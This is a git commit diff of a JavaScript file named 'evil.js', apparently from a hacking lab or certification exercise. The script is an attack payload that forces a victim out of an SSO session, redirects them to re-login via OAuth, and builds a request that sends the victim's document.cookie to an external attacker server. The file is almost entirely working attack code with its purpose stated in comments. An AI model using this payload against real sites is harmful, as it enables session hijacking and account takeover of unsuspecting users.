5371b7c3acdf6ee07fd88c04987aa8264bf9e757
wewego <40270387+wewego@users.noreply.github.com>
2022-10-13 06:03:29 -0700

    Update evil.js

--- evil.js
+++ evil.js
@@ -3,7 +3,7 @@ alert("hello")
 navigator.sendBeacon("http://sso-eejn99.hackthecert.systems/logout","");
 
 //Login to Victim's Account using oAuth Login
-navigator.sendBeacon("http://support-jqn7t8.hackthecert.systems/home","");
+window.location.href = "http://support-jqn7t8.hackthecert.systems/home";
 
 //Send cookie to Attacker Server
 var link="http://nqhwx9kzzrtevzfyt1mdglga117rvg.oastify.com/VictimCookies="+document.cookie;
